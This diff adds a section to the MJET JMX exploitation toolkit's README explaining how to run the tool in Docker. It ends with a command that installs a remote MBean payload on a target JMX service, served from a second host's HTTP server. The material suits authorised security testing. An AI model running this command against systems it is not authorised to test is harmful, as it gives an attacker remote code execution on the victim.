@@ -360,6 +360,31 @@ MJET - MOGWAI LABS JMX Exploitation Toolkit
 [+] Done
 ``` 
 
+### Use mjet in Docker Container
+The usage of mjet.py in a Docker Container is simple. 
+
+Build the Docker Image 
+``` 
+$ docker build -t nodebb . 
+``` 
+
+Start the Docker Container with the exposed ports
+``` 
+$ docker run -d -p 8000:8000 nodebb
+``` 
+
+Enter Docker Container
+``` 
+$ docker exec -it <Docker-ID> /bin/bash
+``` 
+
+Execute mjet.py inside Docker Container
+``` 
+root@<Docker-ID># java -jar jython-standalone-2.7.0.jar mjet.py 10.165.188.23 2222 install super_secret http://10.165.188.1:8000 8000
+``` 
+
+
+
 Reference: https://www.optiv.com/blog/exploiting-jmx-rmi
 
 ## Contributing
